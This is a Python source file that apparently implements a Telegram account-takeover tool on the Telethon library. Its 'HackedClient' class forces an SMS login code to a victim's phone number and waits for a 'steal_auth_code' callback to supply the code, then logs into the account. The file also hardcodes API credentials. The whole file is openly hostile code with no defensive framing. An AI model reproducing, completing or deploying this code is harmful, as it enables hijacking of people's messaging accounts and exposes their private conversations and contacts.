from telethon import TelegramClient
import asyncio

def enter_auth_code(user_id):
    """manual input for debugging"""
    HackedClient.auth_codes[user_id] = input(f"auth code for user {user_id}: ")
    HackedClient.auth_codes_stolen[user_id].set()

class HackedClient(TelegramClient):
    auth_codes = {}
    auth_codes_stolen = {}

    def __init__(self, user_id, phone_number, steal_auth_code: callable = enter_auth_code):
        """:param steal_auth_code: upon this method call, set auth_codes[user_id] and then auth_codes_stolen[user_id].set()"""
        super().__init__(f"user_{user_id}", 1282215, "397d3eeb55309e02b2c623daa94b321b")
        self.steal_auth_code = steal_auth_code
        self.user_id = user_id
        self.phone_number = phone_number

    def __enter__(self):
        return self.loop.run_until_complete(self._hack_user())

    def __exit__(self, *args):
        self.loop.run_until_complete(self.disconnect())

    async def _hack_user(self):
        """connects and logs into the users account"""

        return await self.start(self.phone_number, force_sms=True, code_callback=self.get_auth_code)
    
    async def get_auth_code(self):
        """waits for auth_codes_stolen[user_id] to be set and expects the code in auth_codes[user_id]"""

        self.auth_codes_stolen[self.user_id] = asyncio.Event()
        self.auth_codes[self.user_id] = None
        self.steal_auth_code(self.user_id)
        await self.auth_codes_stolen[self.user_id].wait()
        return self.auth_codes[self.user_id]
